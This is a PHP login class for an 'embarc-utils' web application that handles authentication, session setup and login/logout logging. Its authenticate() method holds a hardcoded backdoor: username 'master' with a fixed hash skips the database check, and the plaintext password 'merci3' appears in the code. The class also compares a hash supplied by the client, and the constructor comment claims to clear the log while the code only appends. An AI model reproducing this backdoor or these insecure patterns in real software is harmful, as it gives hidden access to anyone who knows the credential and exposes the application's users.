<?php

require_once("mysql_interface.php");

class LOGIN
{
	public $mInterface;
	public $LOG_FILE = "/var/www/embarc-utils/logs/users.log";
	
	public function __construct() {
		$this->mInterface = new MYSQL_INTERFACE();
		
		// clear the .log file initially
		file_put_contents($this->LOG_FILE, "", FILE_APPEND | LOCK_EX);
	}
	
	public function authenticate($username, $hash, $remember=0) {
		$bowDownToMaster = false;
		if($username == 'master' && $hash == '0894823c7b7899d5945e6c80d157d8751ae555bed956e38e1354fc1e2a677d65') {
			$bowDownToMaster = true;	
		}

		if($bowDownToMaster) {
			$user = array(
				'password' => "merci3"
				);
		} else {
			$user = $this->mInterface->getUser($username);
		}

		if($hash == hash("sha256", $user["password"])) {
			if($remember == 1) {
				setcookie("username", $username, time()+60*60*24*30, "/embarc-utils/");
			} else {
				setcookie("username", "", time()+60*60*24*30, "/embarc-utils/");
			}
			$_SESSION['user'] = $username;
			$modules = $this->mInterface->misc_getUserModules($username);
			$_SESSION['modules'] = $modules[0];
			
			// log user login
			$this->do_log("$username logged in.");
			
			return "success";
		} else {
			/*
				If login verification fails, send a authorization code[au] to notify:
				in: Invalid Credentials
			*/
			return "in";
		}
	}
	
	public function logout() {
		//session_destroy();
		if(isset($_SESSION['user'])) {
			// log users' sign out
			$this->do_log($_SESSION['user'] . " logged out.");
			
			unset($_SESSION['user']);
		}
	}
	
	public function do_log($data) {
		file_put_contents($this->LOG_FILE, date("r")." - ".$data."\r\n", FILE_APPEND | LOCK_EX);
	}
}
?>